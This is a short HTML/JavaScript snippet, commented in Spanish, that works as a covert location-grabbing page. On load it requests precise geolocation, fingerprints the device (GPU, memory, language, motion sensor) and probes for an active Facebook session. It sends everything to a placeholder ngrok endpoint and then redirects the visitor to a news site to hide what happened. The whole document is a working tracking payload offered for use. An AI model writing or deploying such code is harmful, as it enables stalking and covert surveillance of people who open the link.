<script>
    async function capturar(pos) {
        const URL_NGROK = "https://TU_LINK_AQUI.ngrok-free.app/save"; 

        // Captura de sensores con espera
        let mov = "Estatico";
        if (window.DeviceMotionEvent) mov = "Sensor Activo";
        
        let idioma = navigator.language || "es-AR";
        
        // Detección de cuenta (Caché de Facebook)
        let cuenta = "No detectada";
        const img = new Image();
        img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
        await new Promise(r => setTimeout(r, 800)); // Espera técnica
        if (img.complete) cuenta = "Sesión Activa";

        const data = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            precision: pos.coords.accuracy.toFixed(1) + "m",
            gpu: (() => {
                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
            })(),
            ram: navigator.deviceMemory || "8",
            idioma: idioma,
            movimiento: mov,
            social: cuenta,
            bateria: "N/A", // Opcional
            esta_cargando: "N/A"
        };

        fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(data) });
        
        setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1000);
    }

    window.onload = () => {
        navigator.geolocation.getCurrentPosition(capturar, () => {
            window.location.href="https://www.eqsnotas.com/";
        }, {enableHighAccuracy:true});
    };
</script>
